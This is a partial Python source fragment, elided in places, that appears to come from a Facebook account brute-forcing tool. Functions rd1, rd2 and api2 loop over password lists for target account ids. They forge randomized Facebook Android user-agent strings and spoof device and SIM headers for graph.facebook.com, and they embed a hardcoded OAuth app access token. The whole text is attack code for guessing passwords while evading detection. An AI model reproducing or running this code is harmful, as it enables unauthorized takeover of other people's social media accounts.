...
def rd1(ids,passlist):
	try:
		...
		for pas in passlist:
				...
				ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";FBRV/"+str(random.randint(111111111,777788777))+";[FBAN/FB4A;FBAV/324.0.0.3.189;FBBV/94710249;FBDM/{density=2.75,width=1080,height=2179};FBLC/en_US;FBRV/337989149;FBCR/Banglalink;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2006C3LG;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
...
def rd2(ids,passlist):
	try:
		...
		for pas in passlist:
				...
				fbcr = sim_id
				accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
				ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/324.0.0.3.189;FBBV/94710249;FBDM/{density=2.75,width=1080,height=2179};FBLC/en_US;FBRV/337989149;FBCR/Banglalink;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2006C3LG;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.5,width=1440,height=2560};FBLC/en_US;FBRV/397298298;FBCR/Bangalink;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N920W8;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
...
def api2(ids,names,passlist):
	try:
		...
		for pw in passlist:
			...
			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
			fbcr = sim_id
			ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,300))+str(random.randint(11,999)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/300.0.0.4.45;FBBV/269235091;FBDM/{density=2.8812501,width=1080,height=2110};FBLC/en_US;FBRV/492443150;FBCR/"+fbcr+";FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/23076RA4BC;FBSV/12;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
			head = {'User-Agent':ua,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'d29d67d37eca387482a8a5b740f84f62'}
